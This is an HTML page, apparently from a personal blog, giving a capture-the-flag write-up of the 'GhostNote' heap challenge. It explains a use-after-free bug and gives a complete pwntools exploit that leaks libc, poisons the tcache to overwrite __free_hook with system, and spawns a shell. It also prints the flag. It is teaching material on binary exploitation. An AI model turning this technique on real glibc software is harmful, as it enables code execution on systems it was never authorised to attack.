@@ -1,0 +1,194 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>GhostNote | NextHunt CTF | CTF Writeups</title>
+    <meta name="description" content="Writeup for GhostNote PWN challenge from NextHunt CTF - Heap UAF to tcache poisoning">
+    <link rel="stylesheet" href="../css/style.css">
+    <link rel="icon" href="data:image/svg+xml,<svg xmlns='http://www.w3.org/2000/svg' viewBox='0 0 100 100'><text y='.9em' font-size='90'></text></svg>">
+</head>
+<body>
+    <nav>
+        <div class="container">
+            <a href="../index.html" class="logo"><span class="logo-icon"></span><span>CTF Writeups</span></a>
+            <div class="nav-toggle" onclick="toggleNav()"><span></span><span></span><span></span></div>
+            <ul id="nav-menu">
+                <li><a href="../index.html">Home</a></li>
+                <li><a href="../writeups.html">Writeups</a></li>
+                <li><a href="../about.html">About</a></li>
+                <li><a href="https://github.com/walidzitouni/CTFWriteups" target="_blank">GitHub</a></li>
+            </ul>
+        </div>
+    </nav>
+
+    <div class="breadcrumbs">
+        <div class="container">
+            <a href="../index.html">Home</a><span>/</span>
+            <a href="../writeups.html">Writeups</a><span>/</span>
+            <span style="color: var(--primary-purple);">GhostNote</span>
+        </div>
+    </div>
+
+    <article class="writeup-content">
+        <header>
+            <div class="writeup-tags" style="margin-bottom: 1rem;">
+                <span class="tag">PWN</span>
+                <span class="tag">Heap</span>
+                <span class="tag">UAF</span>
+                <span class="tag difficulty-medium">Medium</span>
+            </div>
+            <h1>GhostNote</h1>
+            <div class="writeup-meta" style="margin-bottom: 2rem; color: var(--text-muted);">
+                <span>2025</span>
+                <span style="margin: 0 1rem;">|</span>
+                <span>NextHunt CTF</span>
+                <span style="margin: 0 1rem;">|</span>
+                <span>Binary Exploitation</span>
+            </div>
+        </header>
+
+        <h2>Challenge Overview</h2>
+        <blockquote>"We created a secure note-taking application that reuses memory for efficiency. Can you exploit it?"</blockquote>
+
+        <h2>Binary Analysis</h2>
+        <pre><code>$ checksec chall
+RELRO:    Full RELRO
+Stack:    Canary found
+NX:       NX enabled
+PIE:      PIE enabled</code></pre>
+        <p>All protections are enabled, but we're dealing with a heap challenge. GLIBC 2.31 uses tcache and has <code>__free_hook</code> available.</p>
+
+        <h3>Functionality</h3>
+        <p>Classic note-taking application with 4 operations:</p>
+        <ol>
+            <li><strong>Add Note</strong> - Allocates a chunk (size 1-4096) and stores pointer in <code>notes[idx]</code></li>
+            <li><strong>Delete Note</strong> - Frees the chunk at <code>notes[idx]</code></li>
+            <li><strong>Show Note</strong> - Prints content of <code>notes[idx]</code></li>
+            <li><strong>Edit Note</strong> - Reads new content into <code>notes[idx]</code></li>
+        </ol>
+
+        <h2>Vulnerability: Use-After-Free (UAF)</h2>
+        <p>In <code>delete_note</code>, the chunk is freed but the pointer is <strong>NOT nullified</strong>:</p>
+        <pre><code>void delete_note() {
+    int idx = get_int();
+    if (idx < 0 || idx > 9 || notes[idx] == NULL) {
+        puts("Invalid index or empty.");
+        return;
+    }
+    free(notes[idx]);      // Chunk is freed
+    // notes[idx] = NULL;  // MISSING! This is the vulnerability
+    puts("Note deleted.");
+}</code></pre>
+
+        <p>This allows us to:</p>
+        <ul>
+            <li><strong>Read freed memory</strong> via <code>show_note()</code> - Leak heap/libc addresses</li>
+            <li><strong>Write to freed memory</strong> via <code>edit_note()</code> - Tcache poisoning</li>
+        </ul>
+
+        <h2>Exploitation Strategy</h2>
+
+        <h3>1. Leak Libc Address</h3>
+        <p>Allocate a large chunk (>0x408 bytes) that goes to unsorted bin when freed:</p>
+        <pre><code>add(2, 0x420, b'C' * 0x41f)  # Large chunk
+add(3, 0x20, b'D' * 0x1f)    # Guard to prevent consolidation
+delete(2)                     # Goes to unsorted bin
+data = show(2)                # UAF read - leaks main_arena pointer</code></pre>
+        <p>The unsorted bin fd/bk pointers point to <code>main_arena+96</code> in libc.</p>
+
+        <h3>2. Tcache Poisoning</h3>
+        <p>Poison tcache to allocate a chunk at <code>__free_hook</code>:</p>
+        <pre><code>add(4, 0x40, b'E' * 0x3f)
+add(5, 0x40, b'F' * 0x3f)
+delete(4)                     # tcache[0x50]: chunk4
+delete(5)                     # tcache[0x50]: chunk5 -> chunk4
+
+edit(5, p64(free_hook))       # UAF write - poison fd to __free_hook
+                              # tcache[0x50]: chunk5 -> __free_hook
+
+add(6, 0x40, b'/bin/sh\x00')  # Returns chunk5
+add(7, 0x40, p64(system))     # Returns __free_hook, write system addr</code></pre>
+
+        <h3>3. Trigger Shell</h3>
+        <pre><code>delete(6)  # free(chunk6) -> system("/bin/sh")</code></pre>
+
+        <h2>Exploit Code</h2>
+        <pre><code>#!/usr/bin/env python3
+from pwn import *
+
+context.arch = 'amd64'
+
+# Libc 2.31-0ubuntu9.17 offsets
+libc_system = 0x52290
+libc_free_hook = 0x1eee48
+
+def main():
+    p = remote('ctf.nexus-security.club', 2808)
+
+    # Setup chunks
+    add(p, 0, 0x80, b'A' * 0x7f)
+    add(p, 1, 0x80, b'B' * 0x7f)
+    delete(p, 0)
+
+    # Leak libc via unsorted bin
+    add(p, 2, 0x420, b'C' * 0x41f)
+    add(p, 3, 0x20, b'D' * 0x1f)
+    delete(p, 2)
+
+    data = show(p, 2)
+    leak = u64(data[:8].ljust(8, b'\x00'))
+    libc_base = leak - 0x1ecbe0
+    log.info(f"Libc base: {hex(libc_base)}")
+
+    system = libc_base + libc_system
+    free_hook = libc_base + libc_free_hook
+
+    # Tcache poisoning
+    add(p, 4, 0x40, b'E' * 0x3f)
+    add(p, 5, 0x40, b'F' * 0x3f)
+    delete(p, 4)
+    delete(p, 5)
+
+    edit(p, 5, p64(free_hook))
+    add(p, 6, 0x40, b'/bin/sh\x00')
+    add(p, 7, 0x40, p64(system))
+
+    # Trigger shell
+    delete(p, 6)
+
+    p.interactive()
+
+if __name__ == '__main__':
+    main()</code></pre>
+
+        <h2>Key Takeaways</h2>
+        <ul>
+            <li><strong>Always NULL pointers after free</strong> - The missing <code>notes[idx] = NULL</code> led to UAF</li>
+            <li><strong>Unsorted bin leaks libc</strong> - Large freed chunks have fd/bk pointing to main_arena</li>
+            <li><strong>Tcache poisoning</strong> - In GLIBC 2.31, tcache fd can be overwritten to get arbitrary allocation</li>
+            <li><strong><code>__free_hook</code></strong> - Classic target for code execution (removed in GLIBC 2.34+)</li>
+        </ul>
+
+        <h2>Flag</h2>
+        <div class="flag-box">
+            <div class="flag-label">Flag</div>
+            <div class="flag-value">nexus{h3ap_u4f_t0_tcache_p0is0ning_is_fun}</div>
+        </div>
+
+        <div style="margin-top: 3rem; padding-top: 2rem; border-top: 1px solid rgba(155, 89, 182, 0.3);">
+            <a href="../writeups.html" class="btn btn-secondary">Back to Writeups</a>
+        </div>
+    </article>
+
+    <footer>
+        <div class="container">
+            <div class="footer-content">
+                <div class="footer-brand"><a href="../index.html" class="logo"><span class="logo-icon"></span><span>CTF Writeups</span></a></div>
+                <div class="footer-links"><a href="../index.html">Home</a><a href="../writeups.html">Writeups</a><a href="../about.html">About</a></div>
+            </div>
+        </div>
+    </footer>
+    <script>function toggleNav() { document.getElementById('nav-menu').classList.toggle('active'); }</script>
+</body>
+</html>
